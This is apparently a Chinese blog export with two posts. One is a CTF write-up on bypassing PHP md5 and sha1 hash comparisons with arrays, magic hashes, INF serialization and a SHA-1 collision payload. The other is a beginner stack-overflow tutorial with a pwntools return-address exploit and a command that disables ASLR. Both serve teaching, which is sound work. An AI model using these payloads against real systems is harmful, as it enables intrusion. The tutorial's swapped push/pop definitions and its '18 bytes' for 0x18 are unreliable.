<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-04.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user != $pass &amp;&amp; md5($user) == md5(md5($pass)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-05.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这次还是<code>==</code>弱类型比较，但仔细观察，发现有一个变量md5()函数外还套了一层md5()也就是双层md5，我们可以采用数组形式进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分析逻辑：</span><br><span class="line">md5(NULL)——&gt;d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"></span><br><span class="line">md5(md5(array()))——&gt;md5(NULL)——&gt;d41d8cd98f00b204e9800998ecf8427e</span><br></pre></td></tr></table></figure>
<p>所以我们给user设为空，而pass给予一个数组类型数据<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass4/%60L35HRAKANK2NWRP%60DK%7BQ%407.png" alt=""></p>
<h2 id="pass5"><a class="header-anchor" href="#pass5">¶</a>pass5</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-05.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user != $pass &amp;&amp; md5($user) === md5(md5($pass)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-06.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这次在上一关的基础上把<code>==</code>弱类型变成了<code>===</code>强类型比较，虽然是强类型比较，但我们null经过md5加密的值是相等的，所以依然可以使用数组的方法进行绕过<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass5/B%24%28%40J_R%5B%7B3FX3%297%5D2S4OFNM.png" alt=""></p>
<h2 id="pass6"><a class="header-anchor" href="#pass6">¶</a>pass6</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-06.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user != $pass &amp;&amp; md5($user) == md5(md5($pass)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-07.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这关为<code>==</code>弱类型比较，但和前面不同的是对于传入的参数user和pass都加了(string)函数进行强制转换为字符串，所以我们采用科学计数法进行绕过，但需要注意的是，有双层md5，所以我们需要寻找第二层md5加密后依然值为科学计数法0e表示的数据<br>
写一个多线程爆破脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author: dota_st</span></span><br><span class="line"><span class="comment"># Date: 2021/2/6 17:15</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    md5 = hashlib.md5(s.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">    md5_double = hashlib.md5(md5.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (md5_double[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&quot;0e&quot;</span> <span class="keyword">and</span> md5_double[<span class="number">2</span>:].isdigit()):</span><br><span class="line">        print(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getstr</span>(<span class="params">payload, s, slen</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (len(s) == slen):</span><br><span class="line">        calc_md5(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">        sl = s + i</span><br><span class="line">        getstr(payload, sl, slen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">40</span>):</span><br><span class="line">        payload = string.ascii_letters + string.digits</span><br><span class="line">        getstr(payload, <span class="string">&#x27;&#x27;</span>, i)</span><br><span class="line">        cpus = multiprocessing.cpu_count()</span><br><span class="line">        stop_event = multiprocessing.Event()</span><br><span class="line">        processes = [multiprocessing.Process(target=getstr, args=(payload,</span><br><span class="line">                                                                   <span class="string">&#x27;&#x27;</span>, i))</span><br><span class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> range(cpus)]</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.start()</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">            p.join()</span><br></pre></td></tr></table></figure>
<p>这里我只爆出四个就停止脚本了，有兴趣的师傅接着继续运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aawBzC</span><br><span class="line">aabsbm9</span><br><span class="line">aaaabGG5T</span><br><span class="line">aaaabKGVH</span><br></pre></td></tr></table></figure>
<p>所以这里变量user我们就给单层md5加密值为科学计数法0e表示的字符串，pass给我们爆破出来双层MD5加密值为科学计数法表示的字符串<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass6/%25Z8U%29SCWA0PH%7DLK%7D%7B%7D%29%7DABA.png" alt=""></p>
<h2 id="pass7"><a class="header-anchor" href="#pass7">¶</a>pass7</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-07.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">        $pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user !== $pass &amp;&amp; md5($user) === md5($pass))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.txt&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;pass-08.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail~~~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please input the user and pass!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这次为<code>===</code>强类型比较，所以我们采用数组形式进行绕过，原理前面说过，这里不再赘述<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass7/%7B_D3PA4EDKC3019D%5B%29%40%60N6S.png" alt=""></p>
<h2 id="pass8"><a class="header-anchor" href="#pass8">¶</a>pass8</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="string">&quot;pass-08.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">auth</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $user;</span><br><span class="line">        <span class="keyword">public</span> $pass;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;user = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;user;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;user) &gt; <span class="number">3</span> || strlen(<span class="keyword">$this</span>-&gt;pass) &gt;<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;level1 is fail~~~&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;user !== <span class="keyword">$this</span>-&gt;pass &amp;&amp; <span class="keyword">$this</span>-&gt;user != <span class="keyword">$this</span>-&gt;pass &amp;&amp; md5(<span class="keyword">$this</span>-&gt;user) === md5(<span class="keyword">$this</span>-&gt;pass))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;success!&lt;br&gt;&quot;</span>;    </span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;level2 is fail~~~&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unserialize($_POST[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<blockquote>
<p>1.传入的变量user和pass长度不能大于3<br>
2.对传入的变量user强制转换为字符串，注意只是user<br>
3.user和pass进行md5加密后强比较</p>
</blockquote>
<p>这里我们采用php中两个特定数据类型值进行绕过，一个是<code>INF</code>，一个是<code>NAN</code></p>
<blockquote>
<p>INF具有无穷大的含义，而NAN是代表着一个在浮点数运算中未定义或不可表述的值。除了与True之外，拿NAN与其他任何值进行松散比较或者严格比较返回结果都是FALSE。<br>
因为他们都是不确定的值，所以在与自身做比较时，会返回false</p>
</blockquote>
<p>这里我们运行一下程序进行比较</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="string">&#x27;INF&#x27;</span>==INF);</span><br><span class="line"><span class="comment">#bool(false)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">&#x27;INF&#x27;</span>!==INF);</span><br><span class="line"><span class="comment">#bool(true)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5(<span class="string">&#x27;INF&#x27;</span>)===md5(INF));</span><br><span class="line"><span class="comment">#bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">&#x27;INF&#x27;</span>);</span><br><span class="line"><span class="comment">#9517fd0bf8faa655990a4dffe358e13e</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(INF);</span><br><span class="line"><span class="comment">#9517fd0bf8faa655990a4dffe358e13e</span></span><br></pre></td></tr></table></figure>
<p>进行序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * User: dota_st</span></span><br><span class="line"><span class="comment"> * Date: 2021/2/6</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">auth</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $user;</span><br><span class="line">    <span class="keyword">public</span> $pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> auth();</span><br><span class="line">$a-&gt;user = INF;</span><br><span class="line">$a-&gt;pass = INF;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">#运行后得到O:4:&quot;auth&quot;:2:&#123;s:4:&quot;user&quot;;d:INF;s:4:&quot;pass&quot;;d:INF;&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass8/78R%288%25%7DZ%28N003FZZK7Q7~29.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/pass8/UEL%29AO%28YYT4~%5BM_~2EM4%5B8Q.png" alt=""></p>
<h2 id="题型补充"><a class="header-anchor" href="#题型补充">¶</a>题型补充</h2>
<h3 id="sha1强碰撞比较"><a class="header-anchor" href="#sha1强碰撞比较">¶</a>sha1强碰撞比较</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$flag=getenv(<span class="string">&#x27;fllag&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&#x27;pass&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;user&#x27;</span>] == $_GET[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no no no no way for you to do so.&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(is_array($_GET[<span class="string">&#x27;user&#x27;</span>]) || is_array($_GET[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;There is no way you can sneak me, young man!&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;user&#x27;</span>]) === sha1($_GET[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Genji:We will see again Hanzo&#x27;</span>.$flag.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Wrong!&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Just G1ve it a try.&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先不能使用数组，其次是采用了<code>===</code>强比较，搜索后发现已存在 sha1 哈希碰撞，即payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br><span class="line"></span><br><span class="line">pass&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn新手入门之栈溢出</title>
    <url>/posts/54640/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>国庆假期打算学学pwn，文章内容主要是跟着 ctfwiki 一路学习下来。</p>
<h2 id="栈的介绍"><a class="header-anchor" href="#栈的介绍">¶</a>栈的介绍</h2>
<p>什么是栈，相信修过数据结构的同学们应该都了解清楚了。栈是一种先进后出的数据结构，其操作主要有入栈(push)和出栈(pop)两种操作，如下图所示<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/stack.png" alt=""><br>
在高级语言运行时会转换为汇编语言，而汇编语言运行的过程中，使用栈的数据结构，用于保存函数的调用信息和局部变量。在学习栈时需要注意 <strong>程序的栈是从进程地址空间的高地址向低地址增长</strong></p>
<h2 id="栈溢出原理"><a class="header-anchor" href="#栈溢出原理">¶</a>栈溢出原理</h2>
<p>栈溢出指的是向栈中某个变量写入的字节数超过了这个变量本身所申请的字节数，因此导致了与其相邻的栈中的变量的值被改变。栈溢出漏洞轻则导致程序的崩溃，重则导致攻击者可以控制程序的执行流程。理解概念后，就可以梳理清楚栈溢出漏洞的前提</p>
<blockquote>
<ul>
<li>程序必须向栈上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
</blockquote>
<p>最经典的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址（当然这个控制地址必须有可执行的权限），我们以一个例子来呈现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;flag&#123;208f1b1289da972682cbc81c8684fcc8&#125;&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先将该文件进行编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1</span><br></pre></td></tr></table></figure>
<p>gcc编译指令中，<code>-m32</code>表示生成32位程序；<code>-fno-stack-protector</code>指的是不开始堆栈溢出保护，即不生成canary；<code>-no-pie</code>表示关闭PIE，避免基址被打乱，生成后用 <strong>checksec</strong> 检查编译出的程序PIE是否关闭<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/S%7D%60M%7DZUMF%7D13%5DUBA%289R0NQN.png" alt=""><br>
从图中可以看出，在编译程序的时候就提醒了我们<code>gets</code>函数是一个危险函数。因为它不检查输入的字符串长度，而是以回车来判断结束，因此容易导致栈溢出漏洞的产生。</p>
<p>接着上面说的 PIE 保护，实质上，linux系统存在地址空间分布随机化（ASLR）机制，简单说就是即使可执行文件开启了 PIE 保护，还需要系统来开启 ASLR 才会真正打乱基址，否则依旧会加载在一个固定的基址上<br>
我们可以通过<code>cat /proc/sys/kernel/randomize_va_space</code>来查看ASLR启动与否</p>
<blockquote>
<ul>
<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
</ul>
</blockquote>
<p>我们通过<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>来关闭ASLR</p>
<p>接下来，我们将生成的可执行文件导入到 ida 进行查看，在main函数中会进入到 <strong>vulnerable()</strong> 函数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/%25%29_I4VHXY%40W%29%29O%60%40_DMU%5DPK.png" alt=""><br>
双击<code>char s</code>，可以看到栈空间大小为<code>0x14</code>，到函数的返回值为<code>0x4-(-0x14)=0x18</code>，也就是只需要18个字节，我们就可以覆盖返回地址的内容。<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/E%5DSFORK4P1NSS%7D__O%28_Q%2533.png" alt=""><br>
我们知道函数的调用过程是，当子函数执行完毕，就会把主函数下一个命令的地址出栈并赋值给 EIP 寄存器，随后 EIP 寄存器就会去该地址执行。而我们在ida中可以看到含有 flag 的 <strong>success</strong> 函数地址为<code>0x08048456</code>，所以我们exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./stack1&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p32(<span class="number">0x08048456</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/misc/%286AY1M%29%289_F%2490_0CM091HX.png" alt=""></p>
<p>成功执行 <strong>success</strong> 函数获取到flag</p>
<h2 id="基本ROP"><a class="header-anchor" href="#基本ROP">¶</a>基本ROP</h2>
<blockquote>
<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在 <strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong> 所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
</blockquote>
<p>常用的汇编指令如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV %src %dest :把数据从源地放到目的地</span><br><span class="line"></span><br><span class="line">push：从栈中取出一个元素</span><br><span class="line"></span><br><span class="line">POP：往栈中压入一个元素</span><br><span class="line"></span><br><span class="line">call：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈</span><br><span class="line"></span><br><span class="line">ret：从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)</span><br></pre></td></tr></table></figure>
<p>ROP，其核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般需要满足如下条件</p>
<blockquote>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
